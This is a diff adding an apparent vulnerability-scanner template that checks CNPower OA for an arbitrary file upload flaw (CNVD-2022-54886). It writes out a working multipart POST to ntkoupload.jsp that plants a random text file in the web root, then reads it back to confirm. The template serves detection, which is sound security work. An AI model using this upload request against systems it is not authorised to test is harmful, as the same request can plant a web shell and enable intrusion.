@@ -1,0 +1,56 @@
+id: cnpower-oa-file-upload-cnvd-2022-54886
+info:
+  name: CNPower OA File Upload Vulnerability (CNVD-2022-54886)
+  author: ProjectDiscoveryAI
+  severity: high
+  reference:
+    - https://github.com/Phuong39/2022-HW-POC
+  description: |
+    CNPower OA systems contain a file upload vulnerability that may allow attackers to upload arbitrary files and execute unauthorized actions.
+variables:
+  s1: "{{rand_text_alpha(16)}}"
+  s2: "{{rand_text_alpha(32)}}"
+http:
+  - id: "file-upload"
+    method: POST
+    path:
+      - "/OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm"
+    body: |
+      ------WebKitFormBoundaryzRSYXfFlXqk6btQm
+      Content-Disposition: form-data; name="EDITFILE"; filename="{{s1}}.txt"
+      Content-Type: image/png
+      
+      {{s2}}
+      ------WebKitFormBoundaryzRSYXfFlXqk6btQm
+      Content-Disposition: form-data; name="newFileName"
+      
+      D:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/{{s1}}.txt
+      ------WebKitFormBoundaryzRSYXfFlXqk6btQm--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Content-Style-Type"
+      - type: word
+        part: header
+        words:
+          - "OAapp"
+  - id: "file-check"
+    method: GET
+    path:
+      - "/OAapp/htpages/app/module/login/{{s1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{s2}}"
